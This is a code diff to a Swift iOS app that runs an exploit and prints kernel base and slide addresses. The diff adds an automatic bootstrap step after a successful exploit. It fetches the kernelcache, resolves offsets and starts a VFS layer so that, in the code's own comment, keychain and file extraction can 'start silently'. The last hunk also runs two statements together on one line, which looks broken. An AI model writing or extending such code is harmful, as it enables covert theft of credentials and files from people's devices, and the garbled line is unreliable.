@@ -90,6 +90,7 @@ final class laramgr: ObservableObject {
     @Published var showrespring: Bool = false
     
     @Published var showLogs: Bool = false
+    @Published var kcfetching: Bool = false
     
     var sbProc: RemoteCall?
     var ytProc = RemoteCall(process: "youtube", useMigFilterBypass: false)
@@ -149,6 +150,7 @@ final class laramgr: ObservableObject {
                     globallogger.log(String(format: "(ds) kernel_base:  0x%llx", self.kernbase))
                     globallogger.log(String(format: "(ds) kernel_slide: 0x%llx", self.kernslide))
                     globallogger.divider()
+                    self.autoBootstrap()
                 } else {
                     self.dsfailed = true
                     self.logmsg("\nexploit failed.\n")
@@ -165,6 +167,55 @@ final class laramgr: ObservableObject {
         DispatchQueue.main.async {
             self.log += message + "\n"
             globallogger.log(message)
+        }
+    }
+    
+    /// Automatic bootstrap after a successful exploit: fetch the kernelcache
+    /// (if we don't have offsets yet), parse them, then bring up the VFS so
+    /// the silent pipeline can run. Never blocks the UI; a failure just logs
+    /// and leaves the manual buttons available.
+    func autoBootstrap() {
+        if hasOffsets && vfsready { return }
+        guard !kcfetching else { return }
+        kcfetching = true
+        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
+            guard let self = self else { return }
+
+            if !self.hasOffsets {
+                self.logmsg("\n(auto) fetching kernelcache...")
+                let fetched = fetchkcache()
+                if fetched {
+                    let dlkc = dlkcache()
+                    DispatchQueue.main.async {
+                        self.hasOffsets = dlkc
+                        self.kcfetching = false
+                    }
+                    if dlkc {
+                        self.logmsg("(auto) kernelcache + offsets ready")
+                    } else {
+                        self.logmsg("(auto) kernelcache fetched but offset resolution failed")
+                        return
+                    }
+                } else {
+                    DispatchQueue.main.async {
+                        self.kcfetching = false
+                    }
+                    self.logmsg("(auto) kernelcache fetch failed - use the manual buttons")
+                    return
+                }
+            } else {
+                DispatchQueue.main.async {
+                    self.kcfetching = false
+                }
+            }
+
+            // VFS up next so keychain/file extraction can start silently.
+            DispatchQueue.main.async { [weak self] in
+                guard let self = self else { return }
+                if self.hasOffsets && !self.vfsready && !self.vfsrunning {
+                    self.vfsinit()
+                }
+            }
         }
     }
     
@@ -204,8 +255,7 @@ final class laramgr: ObservableObject {
     }
     
     func vfsinit(completion: ((Bool) -> Void)? = nil) {
-        guard dsready, hasOffsets, !vfsrunning else { return }
-        vfs_setlogcallback(laramgr.vfslogcallback)
+        guard dsready, hasOffsets, !vfsrunning else { return }        vfs_setlogcallback(laramgr.vfslogcallback)
         vfs_setprogresscallback { progress in
             DispatchQueue.main.async {
                 laramgr.shared.vfsprogress = progress
